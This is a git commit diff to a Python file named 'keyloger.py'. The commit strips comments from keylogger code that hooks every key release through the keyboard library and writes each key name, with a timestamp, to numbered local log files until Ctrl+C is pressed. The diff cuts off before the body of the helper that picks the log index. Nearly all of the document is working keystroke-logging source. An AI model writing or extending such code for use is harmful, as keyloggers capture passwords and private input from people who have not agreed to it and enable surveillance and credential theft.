203b273238fcae20afa669710cc20a5fcca8619d
rb778777 <159143297+rb778777@users.noreply.github.com>
2024-03-22 23:03:20 +0530

    keyloger.py

--- keyloger.py
+++ keyloger.py
@@ -3,24 +3,23 @@ import logging
 import os
 
 def main():
-    # Start recording keystrokes
+    
     keyboard.on_release(callback=record_keystroke)
 
-    # Keep the program running until Ctrl + C is pressed
     try:
         keyboard.wait('ctrl+c')
     except KeyboardInterrupt:
         print("Exiting...")
 
 def record_keystroke(event):
-    # Get the index of the next log file
+
     index = get_next_log_index()
 
-    # Configure logging
+
     filename = f'keylog{index}.txt'
     logging.basicConfig(filename=filename, level=logging.DEBUG, format='%(asctime)s - %(message)s')
 
-    # Log the pressed key
+
     logging.info(event.name)
 
 def get_next_log_index():
